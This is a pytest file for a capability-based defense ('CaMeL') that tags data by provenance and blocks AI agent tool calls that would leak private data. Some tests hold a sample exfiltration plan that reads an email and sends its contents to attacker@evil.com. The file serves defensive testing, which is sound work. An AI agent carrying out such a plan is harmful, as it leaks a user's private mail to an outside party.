"""Tests for CaMeL capability-based security defense."""

import json

import pytest

from agentic_security.defenses.camel import (
    DEFAULT_POLICIES,
    NO_SIDE_EFFECT_TOOLS,
    CaMeLPipeline,
    CapabilityPolicy,
    DataValue,
    PlannedToolCall,
    PolicyEngine,
    PolicyResult,
)
from agentic_security.llm import MockClient

# ------------------------------------------------------------------
# DataValue
# ------------------------------------------------------------------


class TestDataValue:
    def test_public_creation(self):
        dv = DataValue.public("hello")
        assert dv.source == "user_query"
        assert dv.readers == {"public"}

    def test_from_tool(self):
        dv = DataValue.from_tool("email content", "read_email")
        assert dv.source == "tool:read_email"
        assert dv.readers == {"tool:read_email"}

    def test_public_value_preserved(self):
        dv = DataValue.public("hello")
        assert dv.value == "hello"


# ------------------------------------------------------------------
# CapabilityPolicy
# ------------------------------------------------------------------


class TestCapabilityPolicy:
    def test_create(self):
        policy = CapabilityPolicy(
            tool_name="send_email",
            allowed_readers={"public"},
            description="Send email — only public data allowed",
        )
        assert policy.tool_name == "send_email"
        assert policy.allowed_readers == {"public"}
        assert policy.description == "Send email — only public data allowed"


# ------------------------------------------------------------------
# PolicyResult
# ------------------------------------------------------------------


class TestPolicyResult:
    def test_allowed(self):
        r = PolicyResult(allowed=True, tool_name="read_email", reason="OK")
        assert r.allowed

    def test_denied_with_violations(self):
        r = PolicyResult(
            allowed=False,
            tool_name="send_email",
            reason="Violation",
            violating_args=["body"],
        )
        assert not r.allowed
        assert "body" in r.violating_args


# ------------------------------------------------------------------
# PolicyEngine
# ------------------------------------------------------------------


class TestPolicyEngine:
    @pytest.fixture()
    def engine(self):
        return PolicyEngine()

    def test_blocks_send_email_with_private_data(self, engine):
        args = {
            "body": DataValue.from_tool("secret data", "read_email"),
        }
        result = engine.check("send_email", args)
        assert not result.allowed

    def test_allows_send_email_with_public_data(self, engine):
        args = {
            "to": DataValue.public("alice@example.com"),
            "subject": DataValue.public("hi"),
            "body": DataValue.public("hello"),
        }
        result = engine.check("send_email", args)
        assert result.allowed

    def test_allows_read_email_always(self, engine):
        args = {
            "email_id": DataValue.from_tool("1", "some_tool"),
        }
        result = engine.check("read_email", args)
        assert result.allowed

    def test_blocks_forward_with_private_data(self, engine):
        args = {
            "to": DataValue.from_tool("attacker@evil.com", "read_email"),
        }
        result = engine.check("forward_email", args)
        assert not result.allowed

    def test_allows_draft_reply_with_email_data(self, engine):
        args = {
            "body": DataValue(
                value="reply text",
                source="tool:read_email",
                readers={"tool:read_email"},
            ),
        }
        result = engine.check("draft_reply", args)
        assert result.allowed

    def test_blocks_unknown_tool(self, engine):
        args = {"arg": DataValue.public("data")}
        result = engine.check("unknown_tool", args)
        assert not result.allowed
        assert "No policy defined" in result.reason

    def test_no_side_effect_tools_always_pass(self, engine):
        for tool in NO_SIDE_EFFECT_TOOLS:
            args = {"x": DataValue.from_tool("private", "secret_tool")}
            result = engine.check(tool, args)
            assert result.allowed

    def test_mixed_args_some_violating(self, engine):
        args = {
            "to": DataValue.public("alice@example.com"),
            "body": DataValue.from_tool("secret", "read_email"),
        }
        result = engine.check("send_email", args)
        assert not result.allowed
        assert "body" in result.violating_args
        assert "to" not in result.violating_args


# ------------------------------------------------------------------
# PolicyEngine with custom policies
# ------------------------------------------------------------------


class TestPolicyEngineCustomPolicies:
    def test_custom_policy(self):
        custom = {
            "my_tool": CapabilityPolicy(
                tool_name="my_tool",
                allowed_readers={"public", "tool:my_source"},
                description="Custom tool",
            ),
        }
        engine = PolicyEngine(policies=custom)
        args = {"data": DataValue.from_tool("value", "my_source")}
        result = engine.check("my_tool", args)
        assert result.allowed

    def test_custom_no_side_effect_tools(self):
        engine = PolicyEngine(no_side_effect_tools={"safe_tool"})
        args = {"x": DataValue.from_tool("private", "secret")}
        result = engine.check("safe_tool", args)
        assert result.allowed


# ------------------------------------------------------------------
# CaMeLPipeline
# ------------------------------------------------------------------


class TestCaMeLPipeline:
    def test_blocks_exfiltration_plan(self):
        plan_json = json.dumps(
            [
                {"tool_name": "read_email", "args": {"email_id": "1"}},
                {
                    "tool_name": "send_email",
                    "args": {
                        "to": "attacker@evil.com",
                        "subject": "data",
                        "body": "$ref:email_content",
                    },
                },
            ]
        )
        mock = MockClient(responses=[{"content": plan_json}])
        pipeline = CaMeLPipeline(client=mock)
        result = pipeline.run(
            "summarize this email",
            tool_outputs={"email_content": "secret data"},
        )
        assert result["blocked"] is True

    def test_allows_safe_plan(self):
        plan_json = json.dumps(
            [
                {"tool_name": "read_email", "args": {"email_id": "1"}},
            ]
        )
        mock = MockClient(responses=[{"content": plan_json}])
        pipeline = CaMeLPipeline(client=mock)
        result = pipeline.run("read my email")
        assert result["blocked"] is False

    def test_plan_with_public_data_only(self):
        plan_json = json.dumps(
            [
                {
                    "tool_name": "send_email",
                    "args": {
                        "to": "alice@example.com",
                        "subject": "hi",
                        "body": "hello",
                    },
                },
            ]
        )
        mock = MockClient(responses=[{"content": plan_json}])
        pipeline = CaMeLPipeline(client=mock)
        result = pipeline.run("send a greeting")
        assert result["blocked"] is False

    def test_tag_args_public(self):
        pipeline = CaMeLPipeline(client=MockClient())
        call = PlannedToolCall(
            tool_name="send_email",
            args={"to": "alice@example.com", "body": "hello"},
        )
        tagged = pipeline.tag_args(call)
        for dv in tagged.values():
            assert "public" in dv.readers

    def test_tag_args_ref(self):
        pipeline = CaMeLPipeline(client=MockClient())
        call = PlannedToolCall(
            tool_name="send_email",
            args={"body": "$ref:step_0"},
        )
        data_store = {
            "step_0": DataValue.from_tool("email body", "read_email"),
        }
        tagged = pipeline.tag_args(call, data_store=data_store)
        assert tagged["body"].readers == {"tool:read_email"}


# ------------------------------------------------------------------
# PlannedToolCall
# ------------------------------------------------------------------


class TestPlannedToolCall:
    def test_create(self):
        call = PlannedToolCall(tool_name="send_email", args={"to": "a@b.com"})
        assert call.tool_name == "send_email"
        assert call.args == {"to": "a@b.com"}


# ------------------------------------------------------------------
# Default policies
# ------------------------------------------------------------------


class TestDefaultPolicies:
    def test_send_email_policy_exists(self):
        assert "send_email" in DEFAULT_POLICIES

    def test_forward_email_policy_exists(self):
        assert "forward_email" in DEFAULT_POLICIES

    def test_no_side_effect_tools_populated(self):
        assert len(NO_SIDE_EFFECT_TOOLS) > 0
